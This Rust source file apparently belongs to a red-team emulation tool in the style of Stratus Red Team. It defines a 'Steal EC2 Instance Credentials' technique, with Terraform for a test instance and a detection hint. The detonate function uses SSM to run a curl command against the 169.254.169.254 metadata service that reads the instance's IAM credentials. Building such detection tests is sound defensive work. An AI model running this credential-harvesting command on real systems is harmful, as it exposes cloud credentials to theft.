use std::collections::HashMap;
use std::sync::Arc;
use anyhow::Result;

use crate::platform::Platform;
use crate::providers::CloudProviders;
use crate::tactic::MitreTactic;
use crate::technique::{AttackTechnique, BoxFuture};

const TERRAFORM: &str = r#"
data "aws_ami" "amazon_linux" {
  most_recent = true
  owners      = ["amazon"]
  filter {
    name   = "name"
    values = ["amzn2-ami-hvm-*-x86_64-gp2"]
  }
}

resource "aws_iam_role" "instance" {
  name = "stratus-red-team-instance-${random_string.suffix.result}"
  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{ Effect = "Allow", Principal = { Service = "ec2.amazonaws.com" }, Action = "sts:AssumeRole" }]
  })
}

resource "aws_iam_instance_profile" "instance" {
  name = aws_iam_role.instance.name
  role = aws_iam_role.instance.name
}

resource "aws_instance" "target" {
  ami                  = data.aws_ami.amazon_linux.id
  instance_type        = "t3.micro"
  iam_instance_profile = aws_iam_instance_profile.instance.name
  tags = { StratusRedTeam = "true" }
}

resource "random_string" "suffix" {
  length  = 8
  special = false
  upper   = false
}

output "instance_id" {
  value = aws_instance.target.id
}
"#;

async fn detonate_impl(outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> Result<()> {
    let aws = providers.aws().await?;
    let instance_id = outputs
        .get("instance_id")
        .ok_or_else(|| anyhow::anyhow!("missing output: instance_id"))?;

    let mut params = HashMap::new();
    params.insert(
        "commands".to_string(),
        vec![
            "TOKEN=$(curl -s -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' http://169.254.169.254/latest/api/token) && curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/".to_string(),
        ],
    );

    let resp = aws
        .ssm
        .send_command()
        .instance_ids(instance_id)
        .document_name("AWS-RunShellScript")
        .set_parameters(Some(params))
        .send()
        .await
        .map_err(|e| anyhow::anyhow!("{}", e))?;

    let command_id = resp
        .command()
        .and_then(|c| c.command_id())
        .unwrap_or("<unknown>");

    println!(
        "Sent SSM command {} to instance {} to retrieve IMDS credentials via http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        command_id, instance_id
    );

    Ok(())
}

fn detonate(outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> BoxFuture<Result<()>> {
    Box::pin(detonate_impl(outputs, providers))
}

inventory::submit! {
    AttackTechnique {
        id: "aws.credential-access.ec2-steal-instance-credentials",
        friendly_name: "Steal EC2 Instance Credentials",
        description: "Retrieves temporary IAM credentials from the EC2 Instance Metadata Service (IMDS) by running a shell command on the instance via SSM. An attacker with SSM access can exfiltrate the instance role credentials for use outside the instance.",
        detection: "CloudTrail: SendCommand. Inspect SSM command documents for IMDS (169.254.169.254) access.",
        platform: Platform::Aws,
        mitre_tactics: &[MitreTactic::CredentialAccess],
        is_idempotent: true,
        is_slow: false,
        prerequisite_tf: Some(TERRAFORM),
        detonate,
        revert: None,
    }
}
